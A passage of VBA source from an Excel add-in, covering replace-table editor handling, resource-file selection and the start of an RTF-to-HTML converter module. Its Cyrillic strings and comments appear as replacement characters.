        .CompareMode = sh.Shapes("ComboBox_CompareMode").OLEFormat.Object.value - 1
        .ReplaceMode = sh.Shapes("ComboBox_ReplaceMode").OLEFormat.Object.value - 1
        .UseWildcards = sh.Shapes("CheckBox_UseWildcards").OLEFormat.Object.value
        .Name = RT_name$
        If ra.row <= sh.Range("Header").row Then
            .arr = "": .IsEmpty = True
        Else
            .arr = ra.value: .IsEmpty = False
        End If
        .IsFormulaRT = False
        .FileName = REPLACE_TABLES_FOLDER$ & RT_name$ & REPLACE_TABLE_EXT$
        .Save
    End With

    If REPLACE_TABLE_COMBOBOX.value <> RT_name$ Then
        REPLACE_TABLE_COMBOBOX.list = All_RT.ArrayOfNames
        REPLACE_TABLE_COMBOBOX.text = RT_name$
    End If

    UserForm_MAXIMIZE REPLACE_TABLE_USERFORM
    RT_SaveAndClose_Parser = True
    If FP_Objects.Visible Then FP_Objects.ListBox_Items_Click
End Function

Function RT_CloseUnsaved_Parser(ByRef sh As Worksheet) As Boolean
    On Error Resume Next: Err.Clear
    UserForm_MAXIMIZE REPLACE_TABLE_USERFORM
    RT_CloseUnsaved_Parser = True

    If FP_Objects.Visible Then FP_Objects.ListBox_Items_Click
End Function

Function RT_CloseWorkbook_Parser(ByRef sh As Worksheet) As Boolean
    On Error Resume Next: Application.ScreenUpdating = True
    UserForm_MAXIMIZE REPLACE_TABLE_USERFORM
End Function

'Function Create_RT_editor(ByVal RT_name$) As Worksheet
'    On Error Resume Next: Err.Clear
'    Dim NewWorksheet As Worksheet
'
'    Application.ScreenUpdating = False
'    Dim FileManager As New AttachedFiles, res As Boolean, WB As Workbook
'    On Error Resume Next    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| RT_editor.xls
'    RT_name$ = FWF.Replace_symbols(RT_name$)
'
'    ' filename$ = FWF.temp_folder & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & RT_name$ & "|fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & Format(Now, "YYYY-MM-DD--HH-NN-SS") & ".xls"
'    filename$ = FWF.temp_folder & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & RT_name$ & "|fffd|" & ".xls"
'    Set WB = Application.Workbooks(Dir(filename$, vbNormal))
'    If Not WB Is Nothing Then
'        ' MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & RT_name$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
'        WB.Activate
'        Set Create_RT_editor = WB.Worksheets(1)
'        Exit Function
'    End If
'
'    res = FileManager.GetAttachment("RT_editor.xls").SaveAs(filename$)
'    If res Then Workbooks.Open filename$
'    If res Then
'        Set NewWorksheet = Workbooks.Open(filename$).Worksheets(1)
'    Else
'        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
'    End If
'
'    If NewWorksheet Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
'
'    NewWorksheet.DrawingObjects("TextBox_RTname").Object.Text = RT_name$
'    ' NewWorksheet.Protect Left(Rnd(Now) * 1E+15, 10)    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
'
'    Set Create_RT_editor = NewWorksheet
'    ThisWorkbook.Saved = True
'End Function


Function Create_RT_editorNew(ByVal RT_name$) As Worksheet        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    Dim EditorTemplateFile$, Wbname$, WB As Workbook
    Wbname$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & Replace(RT_name$, "\", " __ ") & "|fffd|.xls"

    Set WB = Workbooks(Wbname$)
    If Not WB Is Nothing Then
        WB.Activate
        Set Create_RT_editorNew = WB.Worksheets(1)
        With Create_RT_editorNew
            .Unprotect "ExcelVBA.ru"
            .Shapes("TextBox_RTname").OLEFormat.Object.text = RT_name$
            .Protect "ExcelVBA.ru"
        End With
        Exit Function
    End If

    EditorTemplateFile$ = FWF.temp_folder & RT_EDITOR_FILENAME$
    If Dir(EditorTemplateFile$, vbNormal) = RT_EDITOR_FILENAME$ Then
        If Now - FileDateTime(EditorTemplateFile$) > 5 Then Kill EditorTemplateFile$
    End If

    If Dir(EditorTemplateFile$, vbNormal) = "" Then
        If Not FWF.DownLoadFileFromURL(RT_EDITOR_URL$, EditorTemplateFile$, True) Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Exit Function
        End If
    End If
    If Dir(EditorTemplateFile$, vbNormal) <> RT_EDITOR_FILENAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    Application.ScreenUpdating = False
    Set WB = Workbooks.Add(EditorTemplateFile$)
    If WB Is Nothing Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Application.ScreenUpdating = True: Exit Function
    End If
    Set Create_RT_editorNew = WB.Worksheets(1)
    With Create_RT_editorNew
        .Unprotect "ExcelVBA.ru"
        .Shapes("TextBox_RTname").OLEFormat.Object.text = RT_name$
        .Protect "ExcelVBA.ru"
    End With
    Application.DisplayAlerts = False
    ActiveWorkbook.SaveAs FWF.temp_folder & Wbname$, xlWorkbookNormal
    Application.DisplayAlerts = True
End Function
Attribute VB_Name = "mod_RESOURCE_FILES"
'---------------------------------------------------------------------------------------
' Module        : mod_Resource_Files
' Author        : Igor Vakhnenko            Date: 03.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub Edit_ResourceFiles()
    All_RF.Edit
End Sub

Function ExportObject(ByVal RF_name$, ByVal ObjectType$, ByRef obj As Object) As Boolean
    On Error Resume Next
    Dim RFs As New ResourceFiles
    
    RF_name$ = Trim(RF_name$)
    If RF_name$ <> "" Then
        If Not RFs.FileExist(RF_name$) Then Exit Function
    Else
        RF_name$ = SelectResourceFile
        If RF_name$ = "" Then Exit Function
    End If
    
    With RFs.GetItemByName(RF_name$)
        ExportObject = .AddObject(ObjectType$, obj)
        .Save
    End With
End Function


Function SelectResourceFile(Optional ByVal FormCaption$) As String
    On Error Resume Next
    If FormCaption$ = "" Then FormCaption$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    With FP_Objects
        .Caption = FormCaption$
        Set .All_Items = All_RF
        .EnableSelectMode "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", ""
        .Initialize
        .Hide
        .Show 1
    End With
    SelectResourceFile = SelectedObjectName_F_Objects
End Function

Function All_RF() As ResourceFiles
    On Error Resume Next: Set All_RF = New ResourceFiles
End Function

Attribute VB_Name = "mod_RTF"
'---------------------------------------------------------------------------------------
' Module        : mod_RTF                    Version:
' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: https://www.developerfusion.com/code/180/convert-rtf-to-html/
'---------------------------------------------------------------------------------------

Option Explicit
Option Private Module


'Version 3.03
'Copyright Brady Hegberg 2000
'  I'm not licensing this software but I'd appreciate it if
'  you'd to consider it to be under an lgpl sort of license

'More information can be found at
'http://www2.bitstream.net/~bradyh/downloads/rtf2htmlrm.html

'Converts Rich Text encoded text to HTML format
'if you find some text that this function doesn't
'convert properly please email the coded text to
'bradyh@bitstream.net

'Thanks to various people for assistance including
'   Anthony DiMauro for work on 3.0x font support
'   ...and many others

Private Type CodeList
    code As String
    Status As String               'P=Pending;A=Active;G=Paragraph;D=Dead;K=Killed
    '"Dead" means the code is active but will be killed at next text
    '"Pending" means it's waiting for text - if the code is canceled before text appears it will be killed
    '"Active" means there is text using the code at this moment
    '"Paragraph" means that the code stays active until the next paragraph: "/pard" or "/pntext"
End Type

Public strCurPhrase As String
Dim strHTML As String
Public Codes() As CodeList
Public CodesBeg() As CodeList      'beginning codes
Public NextCodes() As String
Public NextCodesBeg() As String    'beginning codes for next text
Dim CodesTmp() As String           'temp stack for copying
Dim CodesTmpBeg() As String        'temp stack for copying beg

Public strCR As String             'string to use for CRs - blank if +CR not chosen in options
Dim strBeforeText As String
Dim strBeforeText2 As String
Dim strBeforeText3 As String
Dim gPlain As Boolean              'true if all codes shouls be popped before next text
Dim gWBPlain As Boolean            'plain will be true after next text
Dim strColorTable() As String      'table of colors
Dim lColors As Long                '# of colors
Dim strEOL As String               'string to include before <br>
Dim strBOL As String               'string to include after <br>
Dim lSkipWords As Long             'number od words to skip from current
Dim gBOL As Boolean                'a <br> was inserted but no non-whitespace text has been inserted
Dim gPar As Boolean                'true if paragraph was reached since last text
Dim lBrLev As Long                 'bracket level when finding matching brackets
Dim strSecTmp As String            'temporary section buffer
Dim gIgnorePard As Boolean         'should pard end list items or not?

Dim strFontTable() As String       'table of fonts
Dim lFonts As Long                 '# of fonts
Dim strFont As String
Dim strTable As String
Dim strFace As String              'current font face for setting up fontstring
Dim strFontColor As String         'current font color for setting up fontstring
Dim strFontSize As String          'current font size for setting up fontstring
Dim lFontSize As Long
Dim iDefFontSize As Integer        'default font size
Dim gUseFontFace As Boolean        'use different fonts or always use default font

Public gDebug As Boolean           'for debugging
Public gStep As Boolean            'for debugging

Private Sub Test_RTF()
    Dim FileName$, txt$
    FileName$ = "C:\Users\|fffd||fffd||fffd||fffd||fffd|\AppData\Local\Temp\test_actions_result_8516548275.txt"
    txt = FWF.ReadTXTfile(FileName)
    txt = rtf2html(txt)
    ShowTextInBrowser txt
End Sub

Function ClearCodes()
    ReDim Codes(0)
    ReDim CodesBeg(0)
    ClearNext
End Function

Function ClearNext(Optional strExcept As String)
    Dim l As Long
    
    If Len(strExcept) > 0 Then
        If InNext(strExcept) Then
            While NextCodes(1) <> strExcept
                ShiftNext
                ShiftNextBeg
            Wend
            GoTo finally
        End If
    End If
    
    ReDim NextCodes(0)
    ReDim NextCodesBeg(0)
    
finally:
End Function

Function ClearFont()
    strFont = ""
    strTable = ""
    strFontColor = ""
    strFace = ""
    strFontSize = ""
    lFontSize = 0
End Function

Function Codes2NextTill(strCode As String)
    Dim strTmp As String
    Dim strTmpbeg As String
    Dim l As Long
    
    For l = 1 To UBound(Codes)
        If Codes(l).code = strCode Then Exit For
        If Codes(l).Status <> "K" And Codes(l).Status <> "D" Then
            If Not InNext(strCode) Then
                UnShiftNext (Codes(l).code)
                UnShiftNextBeg (CodesBeg(l).code)
            End If
        End If
    Next l
End Function

Function GetColorTable(strSecTmp As String, strColorTable() As String)
    'get color table data and fill in strColorTable array
    Dim lColors As Long
    Dim lBOS As Long
    Dim lEOS As Long
    Dim strTmp As String
    
    lBOS = InStr(strSecTmp, "\colortbl")
    ReDim strColorTable(0)
    lColors = 1
    If lBOS <> 0 Then
        lBOS = InStr(lBOS, strSecTmp, ";")
        lEOS = InStr(lBOS, strSecTmp, ";}")
        If lEOS <> 0 Then
            lBOS = InStr(lBOS, strSecTmp, "\red")
            While ((lBOS <= lEOS) And (lBOS <> 0))
                ReDim Preserve strColorTable(lColors)
                strTmp = Trim(Hex(Mid(strSecTmp, lBOS + 4, 1) & IIf(IsNumeric(Mid(strSecTmp, lBOS + 5, 1)), Mid(strSecTmp, lBOS + 5, 1), "") & IIf(IsNumeric(Mid(strSecTmp, lBOS + 6, 1)), Mid(strSecTmp, lBOS + 6, 1), "")))
                If Len(strTmp) = 1 Then strTmp = "0" & strTmp
                strColorTable(lColors) = strColorTable(lColors) & strTmp
                lBOS = InStr(lBOS, strSecTmp, "\green")
                strTmp = Trim(Hex(Mid(strSecTmp, lBOS + 6, 1) & IIf(IsNumeric(Mid(strSecTmp, lBOS + 7, 1)), Mid(strSecTmp, lBOS + 7, 1), "") & IIf(IsNumeric(Mid(strSecTmp, lBOS + 8, 1)), Mid(strSecTmp, lBOS + 8, 1), "")))
                If Len(strTmp) = 1 Then strTmp = "0" & strTmp
                strColorTable(lColors) = strColorTable(lColors) & strTmp
                lBOS = InStr(lBOS, strSecTmp, "\blue")
                strTmp = Trim(Hex(Mid(strSecTmp, lBOS + 5, 1) & IIf(IsNumeric(Mid(strSecTmp, lBOS + 6, 1)), Mid(strSecTmp, lBOS + 6, 1), "") & IIf(IsNumeric(Mid(strSecTmp, lBOS + 7, 1)), Mid(strSecTmp, lBOS + 7, 1), "")))
                If Len(strTmp) = 1 Then strTmp = "0" & strTmp
                strColorTable(lColors) = strColorTable(lColors) & strTmp
                lBOS = InStr(lBOS, strSecTmp, "\red")
                lColors = lColors + 1
            Wend
        End If
    End If
End Function

Function GetFontTable(strSecTmp As String, strFontTable() As String)
    'get font table data and fill in strFontTable array
    Dim lFonts As Long
    Dim lBOS As Long
    Dim lEOS As Long
    Dim strTmp As String
    Dim lLvl As Long
    Dim strNextChar As String
    
    lBOS = InStr(strSecTmp, "\fonttbl")
    ReDim strFontTable(0)
    lFonts = 0
    If lBOS <> 0 Then
        lEOS = InStr(lBOS, strSecTmp, ";}}")
        If lEOS <> 0 Then
            lBOS = InStr(lBOS, strSecTmp, "\f0")
            While ((lBOS <= lEOS) And (lBOS <> 0))
                ReDim Preserve strFontTable(lFonts)
                strNextChar = Mid(strSecTmp, lBOS, 1)
                While (((strNextChar <> " ") And (lBOS <= lEOS)) Or (lLvl > 0))
                    lBOS = lBOS + 1
                    If strNextChar = "{" Then
                        lLvl = lLvl + 1
                        strNextChar = Mid(strSecTmp, lBOS, 1)
                    ElseIf strNextChar = "}" Then
                        lLvl = lLvl - 1
                        If lLvl = 0 Then
                            strNextChar = " "
                            lBOS = lBOS - 1
                        Else
                            strNextChar = Mid(strSecTmp, lBOS, 1)
                        End If
                    Else
                        strNextChar = Mid(strSecTmp, lBOS, 1)
                    End If
                Wend
                lBOS = lBOS + 1
                strTmp = Mid(strSecTmp, lBOS, InStr(lBOS, strSecTmp, ";") - lBOS)
                If strTmp Like "?*{*}" Then strTmp = Split(strTmp, "{")(0)
                strFontTable(lFonts) = strFontTable(lFonts) & strTmp
                lBOS = InStr(lBOS, strSecTmp, "\f" & (lFonts + 1))
                lFonts = lFonts + 1
            Wend
        End If
    End If
End Function


Function InNext(strTmp) As Boolean
    Dim gTmp As Boolean
    Dim l As Long
    
    l = 1
    gTmp = False
    While l <= UBound(NextCodes) And Not gTmp
        If NextCodes(l) = strTmp Then gTmp = True
        l = l + 1
    Wend
    InNext = gTmp
End Function

Function InNextBeg(strTmp) As Boolean
    Dim gTmp As Boolean
    Dim l As Long
    
    l = 1
    gTmp = False
    While l <= UBound(NextCodesBeg) And Not gTmp
        If NextCodesBeg(l) = strTmp Then gTmp = True
        l = l + 1
    Wend
    InNextBeg = gTmp
End Function

Function InCodes(strTmp, Optional gActiveOnly As Boolean = False) As Boolean
    Dim gTmp As Boolean
    Dim l As Long
    
    l = 1
    gTmp = False
    While l <= UBound(Codes) And Not gTmp
        If gActiveOnly Then
            If Codes(l).code = strTmp And (Codes(l).Status = "A" Or Codes(l).Status = "G") Then gTmp = True
        Else
            If Codes(l).code = strTmp Then gTmp = True
        End If
        l = l + 1
    Wend
    InCodes = gTmp
End Function

Function InCodesBeg(strTmp) As Boolean
    Dim gTmp As Boolean
    Dim l As Long
    
    l = 1
    gTmp = False
    While l <= UBound(CodesBeg) And Not gTmp
        If CodesBeg(l).code = strTmp Then gTmp = True
        l = l + 1
    Wend
    InCodesBeg = gTmp
End Function

Function NabNextLine(strRTF As String) As String
    Dim l As Long
    
    l = InStr(strRTF, vbCrLf)
    If l = 0 Then l = Len(strRTF)
    NabNextLine = TrimAll(Left(strRTF, l))
    If l = Len(strRTF) Then
        strRTF = ""
    Else
        strRTF = TrimAll(Mid(strRTF, l))
    End If
End Function


Function NabNextWord(strLine As String) As String
    Dim l As Long
    Dim lvl As Integer
    Dim gEndofWord As Boolean
    Dim gInCommand As Boolean    'current word is command instead of plain word
    Dim lTmp As Long
    
    gInCommand = False
    l = 0
    lvl = 0
    'strLine = TrimifCmd(strLine)
    If Left(strLine, 1) = "}" Then
        strLine = Mid(strLine, 2)
        NabNextWord = "}"
        GoTo finally
    End If
    If Left(strLine, 1) = "{" Then
        strLine = Mid(strLine, 2)
        NabNextWord = "{"
        GoTo finally
    End If
    If Left(strLine, 2) = "\'" Then
        NabNextWord = Left(strLine, 4)
        strLine = Mid(strLine, 5)
        GoTo finally
    End If
    If Left(strLine, 2) = "\\" Or Left(strLine, 2) = "\{" Or Left(strLine, 2) = "\}" Then
        NabNextWord = Left(strLine, 2)
        strLine = Mid(strLine, 3)
        GoTo finally
    End If
    While Not gEndofWord
        l = l + 1
        If l >= Len(strLine) Then
            If l = Len(strLine) Then l = l + 1
            gEndofWord = True
        ElseIf InStr("\{}", Mid(strLine, l, 1)) Then
            If l = 1 And Mid(strLine, l, 1) = "\" Then gInCommand = True
            '            If Mid(strLine, l + 1, 1) <> "\" And l > 1 And lvl = 0 Then    'avoid...what?
            If l > 1 And lvl = 0 Then
                gEndofWord = True
            End If
        ElseIf Mid(strLine, l, 1) = " " And lvl = 0 And gInCommand Then
            gEndofWord = True
        End If
    Wend
    
    If l = 0 Then l = Len(strLine)
    NabNextWord = Left(strLine, l - 1)
    While Len(NabNextWord) > 0 And InStr("{}", Right(NabNextWord, 1)) And l > 0
        NabNextWord = Left(NabNextWord, Len(NabNextWord) - 1)
        l = l - 1
    Wend
    strLine = Mid(strLine, l)
    If Left(strLine, 1) = " " Then strLine = Mid(strLine, 2)
finally:
End Function

Function NabSection(strRTF As String, lPos As Long) As String
    'grab section surrounding lPos, strip section out of strRTF and return it
    Dim lBOS As Long         'beginning of section
    Dim lEOS As Long         'ending of section
    Dim strChar As String
    Dim lLev As Long         'level of brackets/parens
    Dim lRTFLen As Long
    
    lRTFLen = Len(strRTF)
    
    lBOS = lPos
    strChar = Mid(strRTF, lBOS, 1)
    lLev = 1
    While lLev > 0
        lBOS = lBOS - 1
        If lBOS <= 0 Then
            lLev = lLev - 1
        Else
            strChar = Mid(strRTF, lBOS, 1)
            If strChar = "}" Then
                lLev = lLev + 1
            ElseIf strChar = "{" Then
                lLev = lLev - 1
            End If
        End If
    Wend
    lBOS = lBOS - 1
    If lBOS < 1 Then lBOS = 1
    
    lEOS = lPos
    strChar = Mid(strRTF, lEOS, 1)
    lLev = 1
    While lLev > 0
        lEOS = lEOS + 1
        If lEOS >= lRTFLen Then
            lLev = lLev - 1
        Else
            strChar = Mid(strRTF, lEOS, 1)
            If strChar = "{" Then
                lLev = lLev + 1
            ElseIf strChar = "}" Then
                lLev = lLev - 1
            End If
        End If
    Wend
    lEOS = lEOS + 1
    If lEOS > lRTFLen Then lEOS = lRTFLen
    NabSection = Mid(strRTF, lBOS + 1, lEOS - lBOS - 1)
    strRTF = Mid(strRTF, 1, lBOS) & Mid(strRTF, lEOS)
    strRTF = rtf2html_replace(strRTF, vbCrLf & vbCrLf, vbCrLf)
End Function

Function Next2Codes()
    'move codes from pending ("next") stack to front of current stack
    Dim lNumCodes As Long
    Dim lNumNext As Long
    Dim l As Long
    
    If UBound(NextCodes) > 0 Then
        If InNext("</li>") Then
            For l = UBound(NextCodes) To 1 Step -1
                If NextCodes(l) = "</li>" And l > 1 Then
                    NextCodes(l) = NextCodes(l - 1)
                    NextCodesBeg(l) = NextCodesBeg(l - 1)
                    NextCodes(l - 1) = "</li>"
                    NextCodesBeg(l - 1) = "<li>"
                End If
            Next l
        End If
        
        lNumCodes = UBound(Codes)
        lNumNext = UBound(NextCodes)
        ReDim Preserve Codes(lNumCodes + lNumNext)
        ReDim Preserve CodesBeg(lNumCodes + lNumNext)
        For l = UBound(Codes) To 1 Step -1
            If l > lNumNext Then
                Codes(l) = Codes(l - lNumNext)
                CodesBeg(l) = CodesBeg(l - lNumNext)
            Else
                Codes(l).code = NextCodes(lNumNext - l + 1)
                CodesBeg(l).code = NextCodesBeg(lNumNext - l + 1)
                Select Case Codes(l).code
                    Case "</td></tr></table>", "</li>"
                        Codes(l).Status = "PG"
                        CodesBeg(l).Status = "PG"
                    Case Else
                        Codes(l).Status = "P"
                        CodesBeg(l).Status = "P"
                End Select
            End If
        Next l
        ReDim NextCodes(0)
        ReDim NextCodesBeg(0)
    End If
End Function

Function Codes2Next()
    'move codes from "current" stack to pending ("next") stack
    Dim lNumCodes As Long
    Dim l As Long
    
    If UBound(Codes) > 0 Then
        lNumCodes = UBound(NextCodes)
        ReDim Preserve NextCodes(lNumCodes + UBound(Codes))
        ReDim Preserve NextCodesBeg(lNumCodes + UBound(Codes))
        For l = 1 To UBound(Codes)
            NextCodes(lNumCodes + l) = Codes(l).code
            NextCodesBeg(lNumCodes + l) = CodesBeg(l).code
        Next l
        ReDim Codes(0)
        ReDim CodesBeg(0)
    End If
End Function

Function ParseFont(strColor As String, strSize As String, strFace As String) As String
    Dim strTmpFont As String
    
    If strColor & strSize & strFace = "" Then
        strTmpFont = ""
    Else
        strTmpFont = "<font"
        If strFace <> "" Then
            strTmpFont = strTmpFont & " face=""" & strFace & """"
        End If
        If strColor <> "" Then
            strTmpFont = strTmpFont & " color=""" & strColor & """"
        End If
        If strSize <> "" And Val(strSize) <> iDefFontSize Then
            strTmpFont = strTmpFont & " size=" & strSize
        End If
        strTmpFont = strTmpFont & ">"
    End If
    ParseFont = strTmpFont
End Function

Function PopCode() As String
    If UBound(Codes) > 0 Then
        PopCode = Codes(UBound(Codes)).code
        ReDim Preserve Codes(UBound(Codes) - 1)
    End If
End Function

Function ProcessAfterTextCodes() As String
    Dim strTmp As String
    Dim l As Long
    Dim lLastKilled As Long
    Dim lRetVal As Long
    
    'check for/handle font change
    If strFont <> GetLastFont Then
        KillCode ("</font>")
        If Len(strFont) > 0 Then
            lRetVal = ReplaceInNextBeg("</font>", strFont)
            If lRetVal = 0 Then
                PushNext ("</font>")
                PushNextBeg (strFont)
            End If
        End If
    Else
        If Not InNext("</li>") Then ReviveCode ("</font>")
    End If
    
    'now handle everything killed and move codes farther in to next
    '    ie: \b B\i B \u B\i0 B \u0\b0 => <b>B<i>B<u>B</u>B</i><u>B</u></b>
    strTmp = ""
    If UBound(Codes) > 0 Then
        lLastKilled = 0
        For l = UBound(Codes) To 1 Step -1
            If Codes(l).Status = "K" Then
                lLastKilled = l
                Exit For
            End If
        Next l
        If lLastKilled > 0 Then
            For l = 1 To lLastKilled
                strTmp = strTmp & Codes(l).code
                If Codes(l).code = "</li>" Then strTmp = strTmp & strCR
            Next l
            For l = lLastKilled To 1 Step -1
                If Codes(l).Status <> "D" And Codes(l).Status <> "K" Then
                    If Not InNext(Codes(l).code) Then
                        PushNext (Codes(l).code)
                        PushNextBeg (CodesBeg(l).code)
                    End If
                    Codes(l).Status = "K"
                    CodesBeg(l).Status = "K"
                End If
            Next l
        End If
    End If
    ProcessAfterTextCodes = strTmp
End Function
Function GetActiveCodes() As String
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(Codes) > 0 Then
        For l = 1 To UBound(Codes)
            strTmp = strTmp & Codes(l).code
        Next l
    End If
    GetActiveCodes = strTmp
End Function

Function GetLastFont() As String
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(Codes) > 0 Then
        For l = UBound(Codes) To 1 Step -1
            If Codes(l).code = "</font>" Then
                strTmp = CodesBeg(l).code
                Exit For
            End If
        Next l
    End If
    GetLastFont = strTmp
End Function

Function SetPendingCodesActive()
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(Codes) > 0 Then
        For l = 1 To UBound(Codes)
            If Codes(l).Status = "P" Then
                Codes(l).Status = "A"
                CodesBeg(l).Status = "A"
            ElseIf Codes(l).Status = "PG" Then
                Codes(l).Status = "G"
                CodesBeg(l).Status = "G"
            End If
        Next l
    End If
End Function

Function KillCode(strCode As String, Optional strExcept As String = "") As Long
    'mark all codes of type strCode as killed
    '    except where status = strExcept
    '    if strCode = "*" then mark all killed
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(Codes) > 0 Then
        If Left(strExcept, 1) = "<" Then    'strExcept is either a code or a status
            For l = 1 To UBound(Codes)
                If (Codes(l).code = strCode Or strCode = "*") And Codes(l).code <> strExcept Then
                    Codes(l).Status = "K"
                    CodesBeg(l).Status = "K"
                End If
                If strCode = "*" And Codes(l).code = strExcept Then Exit For
            Next l
        Else
            For l = 1 To UBound(Codes)
                If (Codes(l).code = strCode Or strCode = "*") And Codes(l).Status <> strExcept Then
                    Codes(l).Status = "K"
                    CodesBeg(l).Status = "K"
                End If
            Next l
        End If
    End If
End Function

Function GetAllCodesTill(strTill As String) As String
    'get all codes except strTill
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(Codes) > 0 Then
        For l = UBound(Codes) To 1 Step -1
            If Codes(l).code = strTill Then
                Exit For
            Else
                If Not InNextBeg(CodesBeg(l).code) And Codes(l).Status <> "D" Then
                    strTmp = strTmp & Codes(l).code
                    Codes(l).Status = "K"
                    CodesBeg(l).Status = "K"
                End If
            End If
        Next l
    End If
    GetAllCodesTill = strTmp
End Function


Function GetAllCodesBeg() As String
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(CodesBeg) > 0 Then
        For l = UBound(CodesBeg) To 1 Step -1
            If CodesBeg(l).Status = "P" Then
                strTmp = strTmp & CodesBeg(l).code
                CodesBeg(l).Status = "A"
                Codes(l).Status = "A"
            ElseIf CodesBeg(l).Status = "PG" Then
                strTmp = strTmp & CodesBeg(l).code
                CodesBeg(l).Status = "G"
                Codes(l).Status = "G"
            End If
        Next l
    End If
    GetAllCodesBeg = strTmp
End Function

Function GetAllCodesBegTill(strTill As String) As String
    'get all codes except strTill - stop if strTill reached
    '"<table"
    Dim strTmp As String
    Dim l As Long
    
    strTmp = ""
    If UBound(CodesBeg) > 0 Then
        For l = 1 To UBound(CodesBeg)
            If Codes(l).code = strTill Then
                Exit For
            Else
                If CodesBeg(l).Status = "P" Then
                    strTmp = strTmp & CodesBeg(l).code
                    Codes(l).Status = "A"
                    CodesBeg(l).Status = "A"
                ElseIf CodesBeg(l).Status = "PG" Then
                    strTmp = strTmp & CodesBeg(l).code
                    Codes(l).Status = "G"
                    CodesBeg(l).Status = "G"
                End If
            End If
        Next l
    End If
    GetAllCodesBegTill = strTmp
End Function






Function ShiftNext() As String
    'get 1st code off list and shorten list
    Dim l As Long
    
    If UBound(NextCodes) > 0 Then
